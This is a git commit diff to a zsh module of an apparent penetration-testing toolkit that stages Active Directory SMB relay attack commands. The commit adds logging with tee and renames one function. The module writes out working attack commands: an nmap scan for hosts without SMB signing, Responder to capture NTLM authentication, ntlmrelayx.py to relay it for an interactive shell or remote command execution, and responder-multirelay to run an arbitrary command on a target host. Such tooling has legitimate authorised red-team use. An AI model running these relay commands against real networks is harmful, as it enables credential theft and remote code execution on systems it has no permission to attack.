0733f3537bcccb89ad604af2c55a2101e72365b5
Twilight4 <electrolight071@proton.me>
2024-04-20 11:18:23 +0200

    update

--- modules/nb-ad-smb-relay.zsh
+++ modules/nb-ad-smb-relay.zsh
@@ -17,7 +17,7 @@ nb-ad-smb-relay-install              installs dependencies
 nb-ad-smb-relay-enum                 identify hosts without smb signing
 nb-ad-smb-relay-responder            capture and replay the SMB requests
 nb-ad-smb-relay-ntlmrelay-shell      get interactive shell
-nb-ad-smb-relay-ntlmrelay-command    execute a shell command on a target host using ntlmrelayx.py
+nb-ad-smb-relay-ntlmrelay-whoami     execute a whoami shell command on a target host using ntlmrelayx.py
 nb-ad-smb-relay-multirelay-command   execute a shell command on a target host using multirelay.py
 
 DOC
@@ -31,27 +31,27 @@ nb-ad-smb-relay-install() {
 nb-ad-smb-relay-enum() {
 	nb-vars-set-network
 
-	print -z "grc nmap --script=smb2-security-mode -p 445 ${__NETWORK}"
+  print -z "grc nmap --script=smb2-security-mode -p 445 ${__NETWORK} -oA $(netadpath)/nmap-smb-security"
 }
 
 nb-ad-smb-relay-responder() {
     nb-vars-set-iface
 
-	print -z "sudo responder -I ${__IFACE} dwPv"
+  print -z "sudo responder -I ${__IFACE} dwPv | tee -a $(domadpath)/responder-smb-relay.txt"
 }
 
 nb-ad-smb-relay-ntlmrelay-shell() {
 	__ask "Enter a targets list file"
 	local targets && __askvar targets TARGETS
 
-	print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -i"
+  print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -i | tee -a $(domadpath)/ntlmrelayx.txt"
 }
 
-nb-ad-smb-relay-ntlmrelay-command() {
+nb-ad-smb-relay-ntlmrelay-whoami() {
 	__ask "Enter a targets list file"
 	local targets && __askvar targets TARGETS
 
-	print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -c 'whoami'"
+	print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -c 'whoami' | tee -a $(domadpath)/ntlmrelayx.txt"
 }
 
 nb-ad-smb-relay-multirelay-command() {
@@ -60,5 +60,5 @@ nb-ad-smb-relay-multirelay-command() {
 	__ask "Enter a shell command to execute"
 	local command && __askvar command COMMAND
 
-	print -z "responder-multirelay -t ${__RHOST} -c ${command} -u ALL"
+	print -z "responder-multirelay -t ${__RHOST} -c ${command} -u ALL | tee -a $(domadpath)/responder-multirelay.txt"
 }
